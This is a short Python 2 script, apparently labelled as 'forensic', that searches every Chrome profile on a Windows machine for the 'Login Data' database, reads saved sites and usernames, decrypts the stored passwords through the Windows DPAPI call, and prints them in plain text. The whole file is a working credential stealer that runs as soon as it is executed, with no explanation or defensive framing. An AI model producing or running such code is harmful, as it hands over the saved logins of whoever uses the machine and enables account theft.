import sqlite3
import os
import win32crypt
pathname=''
def chrome_user():
    if os.name=='nt':
        path=os.getenv('localappdata')+"\\Google\\Chrome\\User Data\\"
        dirlist=[]
        for root in os.walk(path):
            dirlist=root[1]
            searchtxt='Login Data'

            x= len(dirlist)
            for i in range(0,x):
               pathnew=os.getenv('localappdata')+"\\Google\\Chrome\\User Data\\" + dirlist[i]
               #print pathnew
               for root,dirs,files in os.walk(pathnew):
                   if searchtxt in files:
                       print 'found'
                       pathname= os.path.join(root, searchtxt)
                       print pathname
                       chrome_forensic(pathname)

def chrome_forensic(pathname):
    connexion = sqlite3.connect(pathname)
    c = connexion.cursor()
    v = c.execute('SELECT action_url, username_value, password_value FROM logins')
    value = v.fetchall()

    for rows in value:
        if os.name == 'nt':
            password = win32crypt.CryptUnprotectData(rows[2], None, None, None, 0)[1]
            if password:
                print "Password found for the Urls below"
                print "urls "+str(rows[0])
                print "Username and password "+str(rows[1]) + " "+str(password)
                print "============================================================\n"
            else:
                print "Non password based urls found are following"
                print "urls and username used "+ str(rows[0])+ " "+ str(rows[1])




chrome_user()
